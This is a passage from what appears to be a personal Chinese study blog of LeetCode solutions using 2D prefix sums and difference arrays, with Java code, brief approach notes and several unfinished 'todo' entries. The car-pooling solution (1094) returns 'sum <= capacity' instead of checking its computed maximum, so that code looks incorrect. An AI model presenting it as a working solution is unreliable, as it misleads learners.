class="keyword">if</span> (preSum[low + <span class="number">1</span>] &lt;= (preSum[n] + preSum[left + <span class="number">1</span>]) / <span class="number">2</span>) <span class="keyword">return</span> low;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1862-向下取整数对和"><a href="#1862-向下取整数对和" class="headerlink" title="1862. 向下取整数对和"></a><a href="https://leetcode.cn/problems/sum-of-floored-pairs/">1862. 向下取整数对和</a></h3><p>todo</p>
<h3 id="363-矩形区域不超过-K-的最大数值和"><a href="#363-矩形区域不超过-K-的最大数值和" class="headerlink" title="363. 矩形区域不超过 K 的最大数值和"></a><a href="https://leetcode.cn/problems/max-sum-of-rectangle-no-larger-than-k/">363. 矩形区域不超过 K 的最大数值和</a></h3><p>todo</p>
<h3 id="2281-巫师的总力量和"><a href="#2281-巫师的总力量和" class="headerlink" title="2281. 巫师的总力量和"></a><a href="https://leetcode.cn/problems/sum-of-total-strength-of-wizards/">2281. 巫师的总力量和</a></h3><p>todo</p>
<h3 id="2983-回文串重新排列查询"><a href="#2983-回文串重新排列查询" class="headerlink" title="2983. 回文串重新排列查询"></a><a href="https://leetcode.cn/problems/palindrome-rearrangement-queries/">2983. 回文串重新排列查询</a></h3><p>todo</p>
<h3 id="3148-矩阵中的最大得分-力扣（LeetCode）"><a href="#3148-矩阵中的最大得分-力扣（LeetCode）" class="headerlink" title="3148. 矩阵中的最大得分 - 力扣（LeetCode）"></a><a href="https://leetcode.cn/problems/maximum-difference-score-in-a-grid/description/">3148. 矩阵中的最大得分 - 力扣（LeetCode）</a></h3><p>todo dp</p>
<h2 id="二维前缀和"><a href="#二维前缀和" class="headerlink" title="二维前缀和"></a>二维前缀和</h2><h3 id="304-二维区域和检索-矩阵不可变"><a href="#304-二维区域和检索-矩阵不可变" class="headerlink" title="304. 二维区域和检索 - 矩阵不可变"></a><a href="https://leetcode.cn/problems/range-sum-query-2d-immutable/">304. 二维区域和检索 - 矩阵不可变</a></h3><h3 id="1314-矩阵区域和"><a href="#1314-矩阵区域和" class="headerlink" title="1314. 矩阵区域和"></a><a href="https://leetcode.cn/problems/matrix-block-sum/">1314. 矩阵区域和</a></h3><h3 id="3070-元素和小于等于-k-的子矩阵的数目"><a href="#3070-元素和小于等于-k-的子矩阵的数目" class="headerlink" title="3070. 元素和小于等于 k 的子矩阵的数目"></a><a href="https://leetcode.cn/problems/count-submatrices-with-top-left-element-and-sum-less-than-k/">3070. 元素和小于等于 k 的子矩阵的数目</a></h3><h3 id="1738-找出第-K-大的异或坐标值"><a href="#1738-找出第-K-大的异或坐标值" class="headerlink" title="1738. 找出第 K 大的异或坐标值"></a><a href="https://leetcode.cn/problems/find-kth-largest-xor-coordinate-value/">1738. 找出第 K 大的异或坐标值</a></h3><h3 id="1292-元素和小于等于阈值的正方形的最大边长"><a href="#1292-元素和小于等于阈值的正方形的最大边长" class="headerlink" title="1292. 元素和小于等于阈值的正方形的最大边长"></a><a href="https://leetcode.cn/problems/maximum-side-length-of-a-square-with-sum-less-than-or-equal-to-threshold/">1292. 元素和小于等于阈值的正方形的最大边长</a></h3><h3 id="221-最大正方形"><a href="#221-最大正方形" class="headerlink" title="221. 最大正方形"></a><a href="https://leetcode.cn/problems/maximal-square/">221. 最大正方形</a></h3><h3 id="1277-统计全为-1-的正方形子矩阵"><a href="#1277-统计全为-1-的正方形子矩阵" class="headerlink" title="1277. 统计全为 1 的正方形子矩阵"></a><a href="https://leetcode.cn/problems/count-square-submatrices-with-all-ones/">1277. 统计全为 1 的正方形子矩阵</a></h3><h3 id="1504-统计全-1-子矩形"><a href="#1504-统计全-1-子矩形" class="headerlink" title="1504. 统计全 1 子矩形"></a><a href="https://leetcode.cn/problems/count-submatrices-with-all-ones/">1504. 统计全 1 子矩形</a></h3><h3 id="1074-元素和为目标值的子矩阵数量"><a href="#1074-元素和为目标值的子矩阵数量" class="headerlink" title="1074. 元素和为目标值的子矩阵数量"></a><a href="https://leetcode.cn/problems/number-of-submatrices-that-sum-to-target/">1074. 元素和为目标值的子矩阵数量</a></h3><p>todo</p>
<h1 id="差分"><a href="#差分" class="headerlink" title="差分"></a>差分</h1><h2 id="一维差分"><a href="#一维差分" class="headerlink" title="一维差分"></a>一维差分</h2><h3 id="2848-与车相交的点"><a href="#2848-与车相交的点" class="headerlink" title="2848. 与车相交的点"></a><a href="https://leetcode.cn/problems/points-that-intersect-with-cars/">2848. 与车相交的点</a></h3><p>区间交集做法也行。</p>
<p>但是范围比较小直接差分了</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfPoints</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] diff = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">100</span> + <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (List&lt;Integer&gt; list : nums) &#123;</span><br><span class="line">            diff[list.get(<span class="number">0</span>)]++;</span><br><span class="line">            diff[list.get(<span class="number">1</span>) + <span class="number">1</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sub</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            sub += diff[i];</span><br><span class="line">            <span class="keyword">if</span> (sub != <span class="number">0</span>) res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1893-检查是否区域内所有整数都被覆盖"><a href="#1893-检查是否区域内所有整数都被覆盖" class="headerlink" title="1893. 检查是否区域内所有整数都被覆盖"></a><a href="https://leetcode.cn/problems/check-if-all-the-integers-in-a-range-are-covered/">1893. 检查是否区域内所有整数都被覆盖</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">range很小，直接差分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCovered</span><span class="params">(<span class="type">int</span>[][] ranges, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ARR_LENGTH</span> <span class="operator">=</span> right - left + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[] diff = <span class="keyword">new</span> <span class="title class_">int</span>[ARR_LENGTH + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] range : ranges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">rangeLeft</span> <span class="operator">=</span> range[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">rangeRight</span> <span class="operator">=</span> range[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!(rangeRight &lt; left || rangeLeft &gt; right)) &#123;</span><br><span class="line">                diff[Integer.max(<span class="number">0</span>, rangeLeft - left)]++;</span><br><span class="line">                diff[Integer.min(ARR_LENGTH - <span class="number">1</span>, rangeRight - left) + <span class="number">1</span>]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; diff.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            sum += diff[i];</span><br><span class="line">            <span class="keyword">if</span>(sum == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1854-人口最多的年份"><a href="#1854-人口最多的年份" class="headerlink" title="1854. 人口最多的年份"></a><a href="https://leetcode.cn/problems/maximum-population-year/">1854. 人口最多的年份</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">差分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumPopulation</span><span class="params">(<span class="type">int</span>[][] logs)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">LEFT_BASE</span> <span class="operator">=</span> <span class="number">1950</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RIGHT_BASE</span> <span class="operator">=</span> <span class="number">2050</span>;</span><br><span class="line">        <span class="type">int</span>[] diff = <span class="keyword">new</span> <span class="title class_">int</span>[RIGHT_BASE - LEFT_BASE + <span class="number">1</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] log : logs) &#123;</span><br><span class="line">            diff[log[<span class="number">0</span>] - LEFT_BASE]++;</span><br><span class="line">            diff[log[<span class="number">1</span>] - LEFT_BASE]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; diff.length; i++) &#123;</span><br><span class="line">            sum += diff[i];</span><br><span class="line">            <span class="keyword">if</span> (sum &gt; maxVal) &#123;</span><br><span class="line">                maxIndex = i;</span><br><span class="line">                maxVal = sum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> LEFT_BASE + maxIndex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2960-统计已测试设备"><a href="#2960-统计已测试设备" class="headerlink" title="2960. 统计已测试设备"></a><a href="https://leetcode.cn/problems/count-tested-devices-after-test-operations/">2960. 统计已测试设备</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目难点在于确保它们的电池百分比 不会低于 0。如果没有该题干直接差分统计即可。</span><br><span class="line">但是发现其实这个条件没有影响，小于零看成0即可</span><br><span class="line"></span><br><span class="line">差分模拟即可之后</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countTestedDevices</span><span class="params">(<span class="type">int</span>[] batteryPercentages)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> batteryPercentages.length;</span><br><span class="line">        <span class="type">int</span>[] diff = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        diff[<span class="number">0</span>] = batteryPercentages[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; batteryPercentages.length; i++) &#123;</span><br><span class="line">            diff[i] = batteryPercentages[i] - batteryPercentages[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum += diff[i];</span><br><span class="line">            <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">                diff[i + <span class="number">1</span>]--;</span><br><span class="line">                <span class="comment">//都不用加了,少执行一次</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现其实只用维护一个变量即可，即减少的次数。懒得改了，记录一下</p>
<h3 id="1094-拼车"><a href="#1094-拼车" class="headerlink" title="1094. 拼车"></a><a href="https://leetcode.cn/problems/car-pooling/">1094. 拼车</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">差分。</span><br><span class="line"></span><br><span class="line">但是这是道中等难度题，需要考虑细节。比如一个站又有下车又有上车，那么肯定先下车在上车。所以不能还是diff[trip[2] + 1] -= trip[0] 需要改成diff[trip[2]] -= trip[0] 表示先下车</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">carPooling</span><span class="params">(<span class="type">int</span>[][] trips, <span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] diff = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1000</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span>[] trip : trips) &#123;</span><br><span class="line">        diff[trip[<span class="number">1</span>]] += trip[<span class="number">0</span>];</span><br><span class="line">        diff[trip[<span class="number">2</span>]] -= trip[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; diff.length; i++) &#123;</span><br><span class="line">        sum += diff[i];</span><br><span class="line">        maxVal = Integer.max(maxVal, sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum &lt;= capacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="732-我的日程安排表-III"><a href="#732-我的日程安排表-III" class="headerlink" title="732. 我的日程安排表 III"></a><a href="https://leetcode.cn/problems/my-calendar-iii/">732. 我的日程安排表 III</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">差分+自带排序的treeMap</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCalendarThree</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> TreeMap&lt;Integer, Integer&gt; map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyCalendarThree</span><span class="params">()</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">book</span><span class="params">(<span class="type">int</span> startTime, <span class="type">int</span> endTime)</span> &#123;</span><br><span class="line">        map.merge(startTime, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        map.merge(endTime, -<span class="number">1</span>, Integer::sum);</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            sum += entry.getValue();</span><br><span class="line">            maxVal = Integer.max(maxVal, sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyCalendarThree object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyCalendarThree obj = new MyCalendarThree();</span></span><br><span class="line"><span class="comment"> * int param_1 = obj.book(startTime,endTime);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="2406-将区间分为最少组数"><a href="#2406-将区间分为最少组数" class="headerlink" title="2406. 将区间分为最少组数"></a><a href="https://leetcode.cn/problems/divide-intervals-into-minimum-number-of-groups/">2406. 将区间分为最少组数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前缀和，求最大值</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minGroups</span><span class="params">(<span class="type">int</span>[][] intervals)</span> &#123;</span><br><span class="line">        TreeMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] interval : intervals) &#123;</span><br><span class="line">            map.merge(interval[<span class="number">0</span>], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            map.merge(interval[<span class="number">1</span>] + <span class="number">1</span>, -<span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            sum += entry.getValue();</span><br><span class="line">            res = Integer.max(res, sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2381-字母移位-II"><a href="#2381-字母移位-II" class="headerlink" title="2381. 字母移位 II"></a><a href="https://leetcode.cn/problems/shifting-letters-ii/">2381. 字母移位 II</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">差分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">shiftingLetters</span><span class="params">(String s, <span class="type">int</span>[][] shifts)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span>[] diff = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] shift : shifts) &#123;</span><br><span class="line">            <span class="keyword">if</span>(shift[<span class="number">2</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                diff[shift[<span class="number">0</span>]]++;</span><br><span class="line">                diff[shift[<span class="number">1</span>] + <span class="number">1</span>]--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                diff[shift[<span class="number">0</span>]]--;</span><br><span class="line">                diff[shift[<span class="number">1</span>] + <span class="number">1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] charArray = s.toCharArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; charArray.length; i++) &#123;</span><br><span class="line">            sum += diff[i];</span><br><span class="line">            charArray[i] = moveChar(charArray[i], sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(charArray);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> <span class="title function_">moveChar</span><span class="params">(<span class="type">char</span> ch, <span class="type">int</span> step)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> ch + step;</span><br><span class="line">        cur = cur - left;</span><br><span class="line">        cur = cur % <span class="number">26</span>;</span><br><span class="line">        <span class="keyword">if</span>(cur &lt; <span class="number">0</span>) cur += <span class="number">26</span>;</span><br><span class="line">        cur += left;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">char</span>) cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="995-K-连续位的最小翻转次数"><a href="#995-K-连续位的最小翻转次数" class="headerlink" title="995. K 连续位的最小翻转次数"></a><a href="https://leetcode.cn/problems/minimum-number-of-k-consecutive-bit-flips/">995. K 连续位的最小翻转次数</a></h3><p>todo</p>
<h3 id="1589-所有排列中的最大和"><a href="#1589-所有排列中的最大和" class="headerlink" title="1589. 所有排列中的最大和"></a><a href="https://leetcode.cn/problems/maximum-sum-obtained-of-any-permutation/">1589. 所有排列中的最大和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询次数最多的取最大值、第二多取第二大值</span><br><span class="line">怎样获取最多</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSumRangeQuery</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span>[][] requests)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] diff = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] request : requests) &#123;</span><br><span class="line">            diff[request[<span class="number">0</span>]]++;</span><br><span class="line">            diff[request[<span class="number">1</span>] + <span class="number">1</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            diff[i] += diff[i-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(diff);</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(diff[i] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            res += (<span class="type">long</span>) diff[i] * nums[i - <span class="number">1</span>];</span><br><span class="line">            res %= MOD_NUM;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1943-描述绘画结果"><a href="#1943-描述绘画结果" class="headerlink" title="1943. 描述绘画结果"></a><a href="https://leetcode.cn/problems/describe-the-painting/">1943. 描述绘画结果</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">差分</span><br><span class="line"></span><br><span class="line">合并后的区间有两个限制：</span><br><span class="line">区间内各位置的颜色的累加和均相等。</span><br><span class="line">区间内各位置的颜色种类均相同。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Long&gt;&gt; <span class="title function_">splitPainting</span><span class="params">(<span class="type">int</span>[][] segments)</span> &#123;</span><br><span class="line">        <span class="type">long</span>[] diff = <span class="keyword">new</span> <span class="title class_">long</span>[<span class="number">100000</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="type">boolean</span>[] mark = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">100000</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] segment : segments) &#123;</span><br><span class="line">            diff[segment[<span class="number">0</span>]] += segment[<span class="number">2</span>];</span><br><span class="line">            diff[segment[<span class="number">1</span>]] -= segment[<span class="number">2</span>];</span><br><span class="line">            mark[segment[<span class="number">0</span>]] = mark[segment[<span class="number">1</span>]] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;List&lt;Long&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100000</span>; i++) &#123;</span><br><span class="line">            sum += diff[i];</span><br><span class="line">            <span class="keyword">if</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//空的结果</span></span><br><span class="line">                <span class="comment">// 当前位置和最后一个已构造区间的累加和不同</span></span><br><span class="line">                <span class="comment">// 当前位置和最后一个已构造区间的不连续，中间有 0</span></span><br><span class="line">                <span class="comment">// 当前位置和最后一个已构造区间有线段变化</span></span><br><span class="line">                <span class="keyword">if</span> (res.isEmpty() || sum != res.get(res.size() - <span class="number">1</span>).get(<span class="number">2</span>) || res.get(res.size() - <span class="number">1</span>).get(<span class="number">1</span>) != i || mark[i]) &#123;</span><br><span class="line">                    res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList((<span class="type">long</span>) i, (<span class="type">long</span>) i + <span class="number">1</span>, (<span class="type">long</span>) sum)));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    res.get(res.size() - <span class="number">1</span>).set(<span class="number">1</span>, res.get(res.size() - <span class="number">1</span>).get(<span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好麻烦的题，看题解做的。感觉有困难难度（或者是我太菜了）</p>
<h3 id="2251-花期内花的数目"><a href="#2251-花期内花的数目" class="headerlink" title="2251. 花期内花的数目"></a><a href="https://leetcode.cn/problems/number-of-flowers-in-full-bloom/">2251. 花期内花的数目</a></h3><p>todo</p>
<h3 id="2772-使数组中的所有元素都等于零"><a href="#2772-使数组中的所有元素都等于零" class="headerlink" title="2772. 使数组中的所有元素都等于零"></a><a href="https://leetcode.cn/problems/apply-operations-to-make-all-array-elements-equal-to-zero/">2772. 使数组中的所有元素都等于零</a></h3><p>todo</p>
<h3 id="798-得分最高的最小轮调"><a href="#798-得分最高的最小轮调" class="headerlink" title="798. 得分最高的最小轮调"></a><a href="https://leetcode.cn/problems/smallest-rotation-with-highest-score/">798. 得分最高的最小轮调</a></h3><p>todo</p>
<h3 id="2528-最大化城市的最小电量"><a href="#2528-最大化城市的最小电量" class="headerlink" title="2528. 最大化城市的最小电量"></a><a href="https://leetcode.cn/problems/maximize-the-minimum-powered-city/">2528. 最大化城市的最小电量</a></h3><p>todo</p>
<h3 id="1674-使数组互补的最少操作次数"><a href="#1674-使数组互补的最少操作次数" class="headerlink" title="1674. 使数组互补的最少操作次数"></a><a href="https://leetcode.cn/problems/minimum-moves-to-make-array-complementary/">1674. 使数组互补的最少操作次数</a></h3><p>todo</p>
<h3 id="3017-按距离统计房屋对数目-II"><a href="#3017-按距离统计房屋对数目-II" class="headerlink" title="3017. 按距离统计房屋对数目 II"></a><a href="https://leetcode.cn/problems/count-the-number-of-houses-at-a-certain-distance-ii/">3017. 按距离统计房屋对数目 II</a></h3><p>todo</p>
